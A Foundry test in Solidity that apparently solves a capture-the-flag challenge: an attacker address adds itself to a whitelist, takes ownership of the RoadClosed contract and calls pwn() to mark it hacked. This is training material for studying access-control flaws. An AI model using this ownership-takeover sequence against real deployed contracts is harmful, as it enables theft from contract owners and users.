// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "@forge-std/Test.sol";

interface IRoadClosed {
    function addToWhitelist(address addr) external;
    function changeOwner(address addr) external;
    function isOwner() external view returns (bool);
    function isHacked() external view returns (bool);
    function pwn(address addr) external payable;
    function pwn() external payable;
}

contract RoadBlockTest is Test {
    IRoadClosed closed;
    address attacker = makeAddr("attacker");
    function setUp() public{
        address deployed = deployCode("src/road-block.sol:RoadClosed");
        closed = IRoadClosed(deployed);
    }

    function test_changeOwnerAndHack() public {
        vm.startPrank(attacker);
        closed.addToWhitelist(attacker);
        closed.changeOwner(attacker);
        closed.pwn(attacker);
        assert(closed.isHacked() == true);
        vm.stopPrank(); 
    }
}
